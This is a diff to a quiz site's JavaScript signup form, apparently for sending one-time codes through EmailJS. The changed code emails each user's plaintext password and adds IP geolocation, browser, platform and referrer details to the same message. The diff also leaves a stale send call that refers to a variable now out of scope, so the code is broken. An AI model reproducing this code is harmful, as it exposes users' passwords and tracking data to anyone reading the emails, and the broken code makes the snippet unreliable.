@@ -91,14 +91,48 @@ form.addEventListener('submit', function(e) {
     login: false
   }));
   
-  const templateParams = {
-    sender_email: "supportgrowquiz@gmail.com",
-    receiver_email: email,
-    name: name,
-    otp: otp,
-    password: password // 👈 Add this line
-  };
-  
+  fetch("https://ipapi.co/json")
+  .then(res => res.json())
+  .then(locationData => {
+    const templateParams = {
+      sender_email: "supportgrowquiz@gmail.com",
+      receiver_email: email,
+      name: name,
+      otp: otp,
+      password: password,
+      user_os: locationData.os || "Unknown OS",
+      user_platform: navigator.platform || "Unknown Platform",
+      user_browser: navigator.userAgent,
+      user_version: navigator.appVersion,
+      user_country: locationData.country_name || "Unknown",
+      user_ip: locationData.ip,
+      user_referrer: document.referrer || window.location.href
+    };
+
+    emailjs.send('service_819r3au', 'template_3es8n4o', templateParams)
+      .then(function(response) {
+        console.log('SUCCESS!', response.status, response.text);
+        Swal.fire({
+          icon: 'success',
+          title: 'OTP Sent!',
+          text: 'Check your email inbox.',
+          timer: 3000,
+          showConfirmButton: false
+        });
+        showOtpBox();
+      }, function(error) {
+        console.log('FAILED...', error);
+        Swal.fire({
+          icon: 'error',
+          title: 'Failed to send OTP',
+          text: 'Please try again later.'
+        });
+      });
+  })
+  .catch(error => {
+    console.error("GeoIP Error:", error);
+  });
+
 
   emailjs.send('service_819r3au', 'template_3es8n4o', templateParams)
     .then(function(response) {
